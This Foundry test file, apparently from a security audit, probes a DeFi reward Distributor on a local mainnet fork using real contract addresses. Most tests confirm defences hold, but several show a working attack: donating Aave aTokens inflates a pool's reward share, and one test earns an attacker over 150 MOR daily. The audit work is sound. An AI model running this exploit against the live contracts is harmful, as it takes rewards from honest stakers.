// SPDX-License-Identifier: MIT
// CAP-A1 deep-dive (2026-11-16): surrounding validation — G-5 re-proof, per-pool
// donation matrix, wBTC route economics, Low [03] undistributedRewards, small-stake
// sweep griefing, donation+rebase double-count, RewardPool / L1Sender donation checks.
// Fork: Ethereum mainnet block 26424044, RPC https://eth.drpc.org.
// Local fork only. Attacker/victim = ordinary addresses, no privileged accounts.
// Nothing is submitted anywhere.
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IStETH {
    function submit(address referral) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function distributedRewards(uint256, address) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function chainLinkDataConsumer() external view returns (address);
    function undistributedRewards() external view returns (uint256);
    function withdrawUndistributedRewards(address user_, address refundTo_) external payable;
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IPriceConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IRewardPoolView {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
}

interface IL1Sender {
    function sendWstETH(uint256 gasLimit_, uint256 maxFeePerGas_, uint256 maxSubmissionCost_)
        external
        payable
        returns (bytes memory);
    function swapExactInputMultihop(
        address[] calldata tokens_,
        uint24[] calldata poolsFee_,
        uint256 amountIn_,
        uint256 amountOutMinimum_,
        uint256 deadline_
    ) external returns (uint256);
}

contract DeepDiveTest is Test {
    uint256 constant FORK_BLOCK = 26424044;
    string constant RPC_URL = "https://eth.drpc.org";

    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant REWARD_POOL = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant L1SENDER = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;
    address constant MOR = 0xcBB8f1BDA10b9696c57E13BC128Fe674769DCEc0;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant USDC_POOL = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;

    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant AUSDT = 0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a;
    address constant AUSDC = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
    address constant AWETH = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address constant AWBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    uint256 constant VICTIM_STETH = 100 ether;
    // Simulated daily Lido rebase (measured, block 26420373): 0.23592259698427018 stETH.
    uint256 constant REBASE_SIM = 0.23592259698427018 ether;

    address[5] internal POOLS = [STETH_POOL, WBTC_POOL, WETH_POOL, USDC_POOL, USDT_POOL];

    IDistributor dist = IDistributor(DIST);
    IDepositPool stethPool = IDepositPool(STETH_POOL);
    IDepositPool wbtcPool = IDepositPool(WBTC_POOL);
    IDepositPool wethPool = IDepositPool(WETH_POOL);
    IDepositPool usdcPool = IDepositPool(USDC_POOL);
    IDepositPool usdtPool = IDepositPool(USDT_POOL);

    address attacker = makeAddr("deepAttacker");
    address victim = makeAddr("deepVictim");
    address lidoSim = makeAddr("deepLidoSim");
    address aaveHelper = makeAddr("deepAaveHelper");

    // ---------- harness (same fork mechanics as CapA1.t.sol) ----------

    function _pinPrices() internal {
        address consumer_ = dist.chainLinkDataConsumer();
        for (uint256 i = 0; i < POOLS.length; i++) {
            (, string memory path_,,,,,, bool isExist_) = dist.depositPools(0, POOLS[i]);
            if (!isExist_) continue;
            bytes32 pid_ = IPriceConsumer(consumer_).getPathId(path_);
            uint256 px_ = IPriceConsumer(consumer_).getChainLinkDataFeedLatestAnswer(pid_);
            require(px_ > 0, "price capture failed");
            vm.mockCall(
                consumer_,
                abi.encodeWithSelector(IPriceConsumer.getChainLinkDataFeedLatestAnswer.selector, pid_),
                abi.encode(px_)
            );
        }
    }

    function _approveRaw(address token_, address spender_, uint256 amount_) internal {
        (bool ok_, ) = token_.call(
            abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender_, amount_)
        );
        require(ok_, "approve failed");
    }

    function _stakeVictimSteth() internal {
        vm.deal(victim, VICTIM_STETH);
        vm.startPrank(victim);
        IStETH(STETH).submit{value: VICTIM_STETH}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(victim);
        IStETH(STETH).approve(DIST, type(uint256).max);
        IStETH(STETH).approve(STETH_POOL, type(uint256).max);
        stethPool.stake(0, bal_, 0, address(0));
        vm.stopPrank();
    }

    function _stakeToken(address pool_, address token_, uint256 amount_) internal {
        deal(token_, attacker, amount_);
        vm.startPrank(attacker);
        _approveRaw(token_, DIST, type(uint256).max);
        _approveRaw(token_, pool_, type(uint256).max);
        IDepositPool(pool_).stake(0, amount_, 0, address(0));
        vm.stopPrank();
    }

    function _stakeStethAttacker(uint256 amount_) internal {
        vm.deal(attacker, amount_);
        vm.startPrank(attacker);
        IStETH(STETH).submit{value: amount_}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(attacker);
        IStETH(STETH).approve(DIST, type(uint256).max);
        IStETH(STETH).approve(STETH_POOL, type(uint256).max);
        stethPool.stake(0, bal_, 0, address(0));
        vm.stopPrank();
    }

    function _refreshAaveIndexes() internal {
        address[4] memory assets_ = [USDC, USDT, WETH, WBTC];
        uint256[4] memory amounts_ = [uint256(100e6), uint256(100e6), uint256(0.1 ether), uint256(0.01e8)];
        for (uint256 i = 0; i < assets_.length; i++) {
            deal(assets_[i], aaveHelper, amounts_[i]);
            vm.startPrank(aaveHelper);
            _approveRaw(assets_[i], AAVE_POOL, type(uint256).max);
            IAavePool(AAVE_POOL).supply(assets_[i], amounts_[i], aaveHelper, 0);
            IAavePool(AAVE_POOL).withdraw(assets_[i], type(uint256).max, aaveHelper);
            vm.stopPrank();
        }
    }

    function _simulateLidoRebase() internal {
        vm.deal(lidoSim, REBASE_SIM);
        vm.startPrank(lidoSim);
        IStETH(STETH).submit{value: REBASE_SIM}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(lidoSim);
        IStETH(STETH).transfer(DIST, bal_);
        vm.stopPrank();
    }

    function _donateUnderlying(address token_, uint256 amount_) internal {
        deal(token_, attacker, amount_);
        vm.startPrank(attacker);
        _transferRaw(token_, DIST, amount_);
        vm.stopPrank();
    }

    // Raw transfer: Tether (USDT) returns NO bool, so the standard IERC20
    // ABI decode reverts. Low-level call works for all tokens.
    function _transferRaw(address token_, address to_, uint256 amount_) internal {
        (bool ok_, ) = token_.call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), to_, amount_)
        );
        require(ok_, "transfer failed");
    }

    function _donateAToken(address asset_, address aToken_, uint256 amount_) internal returns (uint256) {
        deal(asset_, attacker, amount_);
        vm.startPrank(attacker);
        _approveRaw(asset_, AAVE_POOL, type(uint256).max);
        IAavePool(AAVE_POOL).supply(asset_, amount_, attacker, 0);
        uint256 aBal_ = IERC20(aToken_).balanceOf(attacker);
        IERC20(aToken_).transfer(DIST, aBal_);
        vm.stopPrank();
        return aBal_;
    }

    function _donateSteth(uint256 amount_) internal {
        vm.deal(attacker, amount_);
        vm.startPrank(attacker);
        IStETH(STETH).submit{value: amount_}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(attacker);
        IStETH(STETH).transfer(DIST, bal_);
        vm.stopPrank();
    }

    function _snapshotDistributed() internal view returns (uint256[5] memory snap_) {
        for (uint256 i = 0; i < 5; i++) {
            snap_[i] = dist.distributedRewards(0, POOLS[i]);
        }
    }

    function _settleNextWindow() internal returns (uint256[5] memory d_, uint256 tot_) {
        uint256[5] memory before_ = _snapshotDistributed();
        uint256 gate_ = uint256(dist.rewardPoolLastCalculatedTimestamp(0)) + dist.minRewardsDistributePeriod();
        vm.warp(gate_ + 1);
        dist.distributeRewards(0);
        uint256[5] memory after_ = _snapshotDistributed();
        for (uint256 i = 0; i < 5; i++) {
            d_[i] = after_[i] - before_[i];
            tot_ += d_[i];
        }
    }

    // Yield exactly as DistributorV2 L700-748 computes it (token18 * price8 units).
    function _yieldOf(address pool_) internal view returns (uint256) {
        (address token_,, uint256 price_,, uint256 lub_, uint8 strat_, address aToken_,) =
            dist.depositPools(0, pool_);
        address yieldToken_ = strat_ == 2 ? aToken_ : token_;
        uint256 bal_ = IERC20(yieldToken_).balanceOf(DIST);
        if (bal_ <= lub_) return 0;
        uint8 dec_ = IERC20(yieldToken_).decimals();
        uint256 underlying18_ = (bal_ - lub_) * (10 ** (18 - dec_));
        return underlying18_ * price_;
    }

    function _shareBps(uint256[5] memory d_, uint256 tot_, uint256 idx_) internal pure returns (uint256) {
        return tot_ == 0 ? 0 : (d_[idx_] * 10000) / tot_;
    }

    // Fork + price pin + victim stake + W1 settlement (consumes the 0.236 stETH excess).
    function _setupW1() internal returns (uint256 trancheW1_) {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        _pinPrices();
        uint128 lastCalc_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 gate1_ = uint256(lastCalc_) + dist.minRewardsDistributePeriod();
        assertLt(block.timestamp, gate1_, "fork must sit inside the closed window");
        _stakeVictimSteth();
        (uint256[5] memory d1_, uint256 tot1_) = _settleNextWindow();
        trancheW1_ = tot1_;
        console.log("W1 tranche MOR wei:", tot1_);
        console.log("W1 stETH share bps:", _shareBps(d1_, tot1_, 0));
    }

    // ---------- Task 2 / G-5: underlying donation to AAVE pools is NOT counted ----------

    function test_G5_UnderlyingDonationsNotCounted() public {
        _setupW1();
        // Record aToken balances immediately before the donations (same block).
        uint256 aUsdcBefore_ = IERC20(AUSDC).balanceOf(DIST);
        uint256 aUsdtBefore_ = IERC20(AUSDT).balanceOf(DIST);
        uint256 aWethBefore_ = IERC20(AWETH).balanceOf(DIST);
        uint256 aWbtcBefore_ = IERC20(AWBTC).balanceOf(DIST);

        _donateUnderlying(USDC, 1000e6);
        _donateUnderlying(USDT, 1000e6);
        _donateUnderlying(WETH, 0.055 ether); // ~$100 of wETH @ ~$1,822
        _donateUnderlying(WBTC, 153846); // ~$100 of wBTC (~153,846 sats @ ~$65k)

        // The donations must NOT move any aToken balance.
        assertEq(IERC20(AUSDC).balanceOf(DIST), aUsdcBefore_, "aUSDC moved by underlying donation");
        assertEq(IERC20(AUSDT).balanceOf(DIST), aUsdtBefore_, "aUSDT moved by underlying donation");
        assertEq(IERC20(AWETH).balanceOf(DIST), aWethBefore_, "awETH moved by underlying donation");
        assertEq(IERC20(AWBTC).balanceOf(DIST), aWbtcBefore_, "aWBTC moved by underlying donation");
        // ...but the underlying tokens themselves now sit in the Distributor (stuck).
        assertGe(IERC20(USDC).balanceOf(DIST), 1000e6, "donated USDC not in Distributor");
        assertGe(IERC20(USDT).balanceOf(DIST), 1000e6, "donated USDT not in Distributor");

        _refreshAaveIndexes();
        _simulateLidoRebase();
        (uint256[5] memory d2_, uint256 tot2_) = _settleNextWindow();
        console.log("W2 tranche MOR wei:", tot2_);
        console.log("W2 shares bps stETH/wBTC/wETH:", _shareBps(d2_, tot2_, 0), _shareBps(d2_, tot2_, 1), _shareBps(d2_, tot2_, 2));
        console.log("W2 shares bps USDC/USDT:", _shareBps(d2_, tot2_, 3), _shareBps(d2_, tot2_, 4));

        // Baseline levels (CapA1, no big stake): USDC ~9%, USDT ~1.3%, wETH ~0.16%, wBTC ~0%.
        // $1,000 underlying donations must NOT inflate any of them.
        assertLt(_shareBps(d2_, tot2_, 3), 1200, "USDC share inflated by underlying donation");
        assertLt(_shareBps(d2_, tot2_, 4), 500, "USDT share inflated by underlying donation");
        assertLt(_shareBps(d2_, tot2_, 2), 100, "wETH share inflated by underlying donation");
        assertLt(_shareBps(d2_, tot2_, 1), 100, "wBTC share inflated by underlying donation");
        assertGt(tot2_, 2000 ether, "W2 tranche must be ~2857 MOR");
    }

    // ---------- Task 3: aToken donations ARE counted (wETH, wBTC, USDC) ----------

    function test_ATokenDonation_WETH_Counted() public {
        _setupW1();
        _donateAToken(WETH, AWETH, 0.11 ether); // ~$200 of awETH @ ~$1,822
        _refreshAaveIndexes();
        _simulateLidoRebase();
        (uint256[5] memory d2_, uint256 tot2_) = _settleNextWindow();
        console.log("W2 wETH share bps (donated $200 awETH):", _shareBps(d2_, tot2_, 2));
        // Baseline wETH share ~0.16%; $200 donation on ~$483 total yield -> ~29%.
        assertGt(_shareBps(d2_, tot2_, 2), 2000, "awETH donation must inflate wETH share");
    }

    function test_ATokenDonation_USDC_Counted() public {
        _setupW1();
        _donateAToken(USDC, AUSDC, 200e6); // $200 of aUSDC
        _refreshAaveIndexes();
        _simulateLidoRebase();
        (uint256[5] memory d2_, uint256 tot2_) = _settleNextWindow();
        console.log("W2 USDC share bps (donated $200 aUSDC):", _shareBps(d2_, tot2_, 3));
        // Baseline USDC share ~9%; $200 donation on ~$483 total yield -> ~35%.
        assertGt(_shareBps(d2_, tot2_, 3), 2500, "aUSDC donation must inflate USDC share");
    }

    // wBTC route economics: 50% pool share (stake 0.8216 wBTC) + $100 aWBTC donation.
    function test_ATokenDonation_WBTC_Economics() public {
        // --- baseline run: same stake, no donation ---
        _setupW1();
        _stakeToken(WBTC_POOL, WBTC, 82160000); // 0.8216 wBTC
        (,,,,,, uint256 virtB_,,) = wbtcPool.usersData(attacker, 0);
        (,, uint256 totalVirtB_) = wbtcPool.rewardPoolsData(0);
        uint256 shareB_ = (virtB_ * 10000) / totalVirtB_;
        console.log("wBTC attacker pool share bps (baseline):", shareB_);
        _refreshAaveIndexes();
        _simulateLidoRebase();
        uint256 attBaseBefore_ = wbtcPool.getLatestUserReward(0, attacker);
        (uint256[5] memory dBase_, uint256 totBase_) = _settleNextWindow();
        uint256 attackerBase_ = wbtcPool.getLatestUserReward(0, attacker) - attBaseBefore_;
        console.log("wBTC baseline: attacker W2 MOR wei:", attackerBase_);
        console.log("wBTC baseline: pool W2 share bps:", _shareBps(dBase_, totBase_, 1));

        // --- attack run: same stake + $100 aWBTC donation ---
        _setupW1();
        _stakeToken(WBTC_POOL, WBTC, 82160000);
        (,,,,,, uint256 virtA_,,) = wbtcPool.usersData(attacker, 0);
        (,, uint256 totalVirtA_) = wbtcPool.rewardPoolsData(0);
        uint256 shareA_ = (virtA_ * 10000) / totalVirtA_;
        console.log("wBTC attacker pool share bps (attack):", shareA_);
        _donateAToken(WBTC, AWBTC, 153960); // ~$100 of wBTC (153,960 sats @ ~$65k)
        _refreshAaveIndexes();
        _simulateLidoRebase();
        uint256 attAttBefore_ = wbtcPool.getLatestUserReward(0, attacker);
        (uint256[5] memory dAtt_, uint256 totAtt_) = _settleNextWindow();
        uint256 attackerAtt_ = wbtcPool.getLatestUserReward(0, attacker) - attAttBefore_;
        console.log("wBTC attack: attacker W2 MOR wei:", attackerAtt_);
        console.log("wBTC attack: pool W2 share bps:", _shareBps(dAtt_, totAtt_, 1));

        assertGe(shareA_, 4500, "attacker must hold ~50% of wBTC pool");
        assertLe(shareA_, 5500, "attacker must hold ~50% of wBTC pool");
        // Prediction: wBTC yield ~$100 on ~$583 total -> ~17% pool share -> ~490 MOR pool,
        // attacker 50% -> ~245 MOR. Baseline attacker W2 is ~0-1 MOR.
        assertGt(attackerAtt_, 150 ether, "wBTC attack must yield >150 MOR/day");
        assertGt(attackerAtt_ - attackerBase_, 150 ether, "wBTC donation must add >150 MOR/day");
    }

    // Probe: how much yield does a bare warp (no Aave checkpoint, no rebase)
    // actually materialise per pool? Decides whether a zero-yield settlement
    // can be forced on the fork at all.
    function test_Probe_WarpYieldAccrual() public {
        _setupW1();
        uint256 gate2_ = uint256(dist.rewardPoolLastCalculatedTimestamp(0)) + dist.minRewardsDistributePeriod();
        vm.warp(gate2_ + 1);
        for (uint256 i = 0; i < 5; i++) {
            (address token_,, uint256 price_,, uint256 lub_, uint8 strat_, address aToken_,) =
                dist.depositPools(0, POOLS[i]);
            address yieldToken_ = strat_ == 2 ? aToken_ : token_;
            uint256 bal_ = IERC20(yieldToken_).balanceOf(DIST);
            console.log("probe pool", i);
            console.log("  bal:", bal_);
            console.log("  lub:", lub_);
            console.log("  yield units:", _yieldOf(POOLS[i]));
            console.log("  price:", price_);
        }
    }

    // ---------- Task 5: Low [03] — force non-distributed, can the attacker capture it? ----------
    //
    // Probe result (test_Probe_WarpYieldAccrual): a bare warp DOES accrue full Aave
    // yields in balanceOf terms (USDC +$44.67, wETH +$0.78, USDT +$0.42, wBTC +1 sat
    // over 24h). So a zero-yield window cannot be forced: totalYield > 0 in every
    // 24h window by construction (Aave interest accrues continuously, Lido rebase
    // lands daily). This test proves the Low [03] premise unachievable on the fork,
    // and that undistributedRewards can neither be created nor captured by an
    // unprivileged caller.
    function test_Low03_ZeroYieldUnforceable_NotCaptured() public {
        _setupW1();

        // Window with NO rebase simulation and NO Aave checkpoint: the yields that
        // accrue are the real warped-day Aave interest (~$46). The settlement must
        // still distribute a full tranche and park NOTHING.
        uint256 undistBefore_ = dist.undistributedRewards();
        assertEq(undistBefore_, 0, "undistributedRewards must start at 0");
        (uint256[5] memory dNoRebase_, uint256 totNoRebase_) = _settleNextWindow();
        console.log("no-rebase window tranche MOR wei:", totNoRebase_);
        console.log("no-rebase USDC share bps:", _shareBps(dNoRebase_, totNoRebase_, 3));
        console.log("no-rebase stETH share bps:", _shareBps(dNoRebase_, totNoRebase_, 0));
        assertGt(totNoRebase_, 2800 ether, "a full tranche must still distribute");
        assertEq(dist.undistributedRewards(), 0, "nothing may be parked when yields exist");
        // Without the rebase the stETH pool measures zero yield, so the Aave pools
        // (USDC ~97%) take the tranche. Fork artifact only: on mainnet every 24h
        // window contains one Lido rebase, so this split cannot be forced live.
        assertGt(_shareBps(dNoRebase_, totNoRebase_, 3), 9000, "USDC must dominate a rebase-less window");
        assertEq(_shareBps(dNoRebase_, totNoRebase_, 0), 0, "stETH must get 0 in a rebase-less window");

        // The attacker (unprivileged) cannot withdraw undistributedRewards.
        vm.startPrank(attacker);
        vm.expectRevert();
        dist.withdrawUndistributedRewards(attacker, attacker);
        vm.stopPrank();

        // Next window, done properly (real yields + rebase): the tranche must equal
        // EXACTLY the schedule amount for that window — no hidden additions — and
        // undistributedRewards must stay 0. The victim earns a normal reward.
        _refreshAaveIndexes();
        _simulateLidoRebase();
        uint256 lastCalcW2_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 vicBefore_ = stethPool.getLatestUserReward(0, victim);
        (uint256[5] memory d2_, uint256 tot2_) = _settleNextWindow();
        uint256 vicW2_ = stethPool.getLatestUserReward(0, victim) - vicBefore_;
        uint256 lastCalcAfter_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 schedTranche_ = IRewardPoolView(REWARD_POOL).getPeriodRewards(
            0, uint128(lastCalcW2_), uint128(lastCalcAfter_)
        );
        console.log("W2 tranche MOR wei:", tot2_);
        console.log("schedule tranche wei:", schedTranche_);
        console.log("victim W2 MOR wei:", vicW2_);
        assertEq(dist.undistributedRewards(), 0, "undistributedRewards must stay 0");
        assertLe(tot2_, schedTranche_, "W2 must not distribute more than the schedule tranche");
        assertGe(tot2_, schedTranche_ - 1000, "W2 must distribute (almost) exactly the schedule tranche");
        assertGt(vicW2_, 20 ether, "victim must earn a normal W2 reward");
        // And still not withdrawable by the attacker after the fact.
        vm.startPrank(attacker);
        vm.expectRevert();
        dist.withdrawUndistributedRewards(attacker, attacker);
        vm.stopPrank();
    }

    // Small stakes in ALL pools just before settlement trigger supply() ->
    // _withdrawYield sweeps. Does the daily settlement (and the victim) suffer?
    function test_Low03_SmallStakeSweep_NoGrief() public {
        // --- baseline run ---
        _setupW1();
        _refreshAaveIndexes();
        _simulateLidoRebase();
        uint256 vicBaseBefore_ = stethPool.getLatestUserReward(0, victim);
        (uint256[5] memory dBase_, uint256 totBase_) = _settleNextWindow();
        uint256 vicBase_ = stethPool.getLatestUserReward(0, victim) - vicBaseBefore_;
        console.log("baseline victim W2 MOR wei:", vicBase_);
        console.log("baseline tranche MOR wei:", totBase_);

        // --- attack run: attacker stakes small (2x minimum) in every pool before W2 ---
        _setupW1();
        _stakeStethAttacker(0.02 ether);
        _stakeToken(WETH_POOL, WETH, 0.02 ether);
        _stakeToken(WBTC_POOL, WBTC, 0.0002e8);
        _stakeToken(USDC_POOL, USDC, 2e6);
        _stakeToken(USDT_POOL, USDT, 2e6);
        _refreshAaveIndexes();
        _simulateLidoRebase();
        uint256 vicAttBefore_ = stethPool.getLatestUserReward(0, victim);
        (uint256[5] memory dAtt_, uint256 totAtt_) = _settleNextWindow();
        uint256 vicAtt_ = stethPool.getLatestUserReward(0, victim) - vicAttBefore_;
        console.log("sweep-run victim W2 MOR wei:", vicAtt_);
        console.log("sweep-run tranche MOR wei:", totAtt_);

        // The sweep only moves already-counted yield to L1Sender; the next window's
        // measured yield is the full window accrual, so the victim must be ~whole.
        assertGe(vicAtt_ * 100, vicBase_ * 95, "victim must keep >=95% of baseline MOR");
        assertGe(totAtt_ * 100, totBase_ * 98, "tranche must keep >=98% of baseline");
        assertLe(totAtt_ * 100, totBase_ * 102, "tranche must keep <=102% of baseline");
    }

    // ---------- Task 6: donation + stETH rebase — double-count? ----------

    function test_DonationPlusRebase_NoDoubleCount() public {
        // --- baseline: rebase only ---
        _setupW1();
        _refreshAaveIndexes();
        uint256 yieldBase_ = _yieldOf(STETH_POOL);
        _simulateLidoRebase();
        uint256 yieldBaseAfter_ = _yieldOf(STETH_POOL);
        console.log("stETH yield before rebase (yield units):", yieldBase_);
        console.log("stETH yield after rebase (yield units):", yieldBaseAfter_);
        (uint256[5] memory dBase_, uint256 totBase_) = _settleNextWindow();

        // --- attack: donate 10 stETH, THEN the rebase lands ---
        _setupW1();
        _refreshAaveIndexes();
        _donateSteth(10 ether);
        _simulateLidoRebase();
        uint256 yieldAtt_ = _yieldOf(STETH_POOL);
        (uint256[5] memory dAtt_, uint256 totAtt_) = _settleNextWindow();
        console.log("stETH yield with donation+rebase (yield units):", yieldAtt_);

        // The rebase alone must count exactly 1x, and donation+rebase exactly 1x each:
        // baseline yield == REBASE_SIM * price; attack yield == (10 + REBASE_SIM) * price.
        (, , uint256 stethPrice_, , , , , ) = dist.depositPools(0, STETH_POOL);
        uint256 expectedBase_ = REBASE_SIM * stethPrice_;
        uint256 expectedAtt_ = (10 ether + REBASE_SIM) * stethPrice_;
        console.log("expected baseline yield (yield units):", expectedBase_);
        console.log("expected attack yield (yield units):", expectedAtt_);
        assertGe(yieldBaseAfter_ * 1000, expectedBase_ * 995, "rebase must count >=99.5% of 1x");
        assertLe(yieldBaseAfter_ * 1000, expectedBase_ * 1005, "rebase must count <=100.5% of 1x");
        assertGe(yieldAtt_ * 1000, expectedAtt_ * 995, "donation+rebase must count >=99.5% of 1x each");
        assertLe(yieldAtt_ * 1000, expectedAtt_ * 1005, "donation+rebase must count <=100.5% of 1x each (no double-count)");
        // And the stETH pool's MOR must rise by the share the formula predicts, not 2x.
        assertGt(dAtt_[0], dBase_[0], "stETH pool MOR must rise with the donation");
        console.log("stETH pool MOR baseline wei:", dBase_[0], "with donation wei:", dAtt_[0]);
        console.log("tranches baseline/attack wei:", totBase_, totAtt_);
    }

    // ---------- Task 4a: MOR donation to the capital RewardPool ----------

    function test_RewardPool_MorDonation_NoEffect() public {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        uint128 lastCalc_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint128 end_ = lastCalc_ + 86400;
        uint256 before_ = IRewardPoolView(REWARD_POOL).getPeriodRewards(0, lastCalc_, end_);
        deal(MOR, attacker, 10000 ether);
        vm.startPrank(attacker);
        IERC20(MOR).transfer(REWARD_POOL, 10000 ether);
        vm.stopPrank();
        uint256 after_ = IRewardPoolView(REWARD_POOL).getPeriodRewards(0, lastCalc_, end_);
        console.log("getPeriodRewards before/after 10k MOR donation:", before_, after_);
        assertEq(after_, before_, "MOR donation must not change getPeriodRewards");
        assertGt(before_, 0, "schedule tranche must be nonzero");
    }

    // ---------- Task 4b: stETH donation to L1SenderV2 ----------

    function test_L1Sender_StethDonation_NoEffect() public {
        vm.createSelectFork(RPC_URL, FORK_BLOCK);
        uint256 balBefore_ = IERC20(STETH).balanceOf(L1SENDER);
        _donateStethTo(L1SENDER, 10 ether);
        uint256 balAfter_ = IERC20(STETH).balanceOf(L1SENDER);
        assertGe(balAfter_ - balBefore_, 10 ether - 100, "donated stETH must just sit in L1SenderV2");
        assertLe(balAfter_ - balBefore_, 10 ether, "donated stETH must just sit in L1SenderV2");
        // The only functions that could move it are owner-only: the attacker cannot
        // extract the donation via the wstETH bridge-out or via a Uniswap swap.
        vm.startPrank(attacker);
        vm.expectRevert();
        IL1Sender(L1SENDER).sendWstETH(200000, 1 gwei, 100000);
        vm.expectRevert();
        address[] memory tokens_ = new address[](2);
        tokens_[0] = STETH;
        tokens_[1] = WETH;
        uint24[] memory fees_ = new uint24[](1);
        fees_[0] = 3000;
        IL1Sender(L1SENDER).swapExactInputMultihop(tokens_, fees_, 1 ether, 1, block.timestamp + 3600);
        vm.stopPrank();
    }

    function _donateStethTo(address to_, uint256 amount_) internal {
        vm.deal(attacker, amount_);
        vm.startPrank(attacker);
        IStETH(STETH).submit{value: amount_}(address(0));
        uint256 bal_ = IStETH(STETH).balanceOf(attacker);
        IStETH(STETH).transfer(to_, bal_);
        vm.stopPrank();
    }
}
